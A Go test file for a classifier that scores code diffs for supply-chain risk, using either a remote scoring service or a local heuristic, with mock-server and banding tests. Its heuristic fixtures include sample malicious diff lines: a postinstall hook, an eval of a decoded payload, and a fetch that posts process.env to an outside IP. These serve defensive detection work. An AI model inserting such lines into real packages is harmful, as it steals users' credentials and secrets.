package classifier

import (
	"encoding/json"
	"fmt"
	"net/http"
	"net/http/httptest"
	"testing"
)

func TestBandOf(t *testing.T) {
	for score, want := range map[float64]Band{0: Clean, 0.2: Clean, 0.21: Uncertain, 0.5: Uncertain, 0.79: Uncertain, 0.8: Suspicious, 1: Suspicious} {
		if got := BandOf(score); got != want {
			t.Errorf("BandOf(%v) = %s, want %s", score, got, want)
		}
	}
}

func TestNewPicksImplementation(t *testing.T) {
	if _, ok := New("", "").(Heuristic); !ok {
		t.Error("empty key should select the heuristic")
	}
	if _, ok := New(NoKey, "").(Heuristic); !ok {
		t.Error("placeholder key should select the heuristic")
	}
	j, ok := New("k1", "").(*Jev)
	if !ok || j.BaseURL != DefaultJevURL || j.Model != DefaultJevModel {
		t.Errorf("New(k1) = %#v", New("k1", ""))
	}
}

func TestJevClassify(t *testing.T) {
	var got jevRequest
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		if r.URL.Path != "/v1/systemone" || r.Header.Get("Authorization") != "Bearer k1" {
			http.Error(w, "bad request", http.StatusBadRequest)
			return
		}
		if err := json.NewDecoder(r.Body).Decode(&got); err != nil {
			http.Error(w, err.Error(), http.StatusBadRequest)
			return
		}
		fmt.Fprint(w, `{"model":"jev-1.13.0","answers":{"suspicious":{"type":"noul","noul":0.55}},"usage":{"input_tokens":10,"output_tokens":2}}`)
	}))
	defer srv.Close()

	res, err := (&Jev{BaseURL: srv.URL, APIKey: "k1", Model: "jev-latest"}).Classify(t.Context(), "+eval(x)")
	if err != nil {
		t.Fatal(err)
	}
	if res.Score != 0.55 || res.Model != "jev-1.13.0" {
		t.Fatalf("result = %+v", res)
	}
	q := got.Questions[questionKey]
	if got.State != "+eval(x)" || got.Model != "jev-latest" || q.Type != "noul" || q.Criteria["true"] == "" || q.Instructions == "" {
		t.Fatalf("request = %+v", got)
	}
}

func TestJevErrors(t *testing.T) {
	for name, handler := range map[string]http.HandlerFunc{
		"status":         func(w http.ResponseWriter, _ *http.Request) { http.Error(w, "boom", http.StatusInternalServerError) },
		"missing answer": func(w http.ResponseWriter, _ *http.Request) { fmt.Fprint(w, `{"model":"jev","answers":{}}`) },
		"null score": func(w http.ResponseWriter, _ *http.Request) {
			fmt.Fprint(w, `{"model":"jev","answers":{"suspicious":{"type":"noul"}}}`)
		},
		"score below range": func(w http.ResponseWriter, _ *http.Request) {
			fmt.Fprint(w, `{"model":"jev","answers":{"suspicious":{"type":"noul","noul":-0.5}}}`)
		},
		"score above range": func(w http.ResponseWriter, _ *http.Request) {
			fmt.Fprint(w, `{"model":"jev","answers":{"suspicious":{"type":"noul","noul":1.5}}}`)
		},
	} {
		t.Run(name, func(t *testing.T) {
			srv := httptest.NewServer(handler)
			defer srv.Close()
			if _, err := (&Jev{BaseURL: srv.URL, APIKey: "k", Model: "m"}).Classify(t.Context(), "d"); err == nil {
				t.Fatal("expected an error")
			}
		})
	}
}

func TestHeuristic(t *testing.T) {
	cases := map[string]struct {
		diff string
		want Band
	}{
		"docs only":      {"+++ b/README.md\n+Fixed a typo\n", Clean},
		"reads env":      {"+const token = process.env.NPM_TOKEN\n", Uncertain},
		"install+eval":   {"+  \"postinstall\": \"node setup.js\",\n+eval(atob(payload))\n+fetch('http://1.2.3.4/x', {body: process.env})\n", Suspicious},
		"removed lines":  {"-eval(x)\n-process.env.SECRET\n", Clean},
		"header ignored": {"+++ b/eval(.js\n", Clean},
	}
	for name, tc := range cases {
		t.Run(name, func(t *testing.T) {
			res, err := Heuristic{}.Classify(t.Context(), tc.diff)
			if err != nil {
				t.Fatal(err)
			}
			if got := BandOf(res.Score); got != tc.want || res.Model != "heuristic" {
				t.Fatalf("score %.2f → %s, want %s", res.Score, got, tc.want)
			}
		})
	}
}
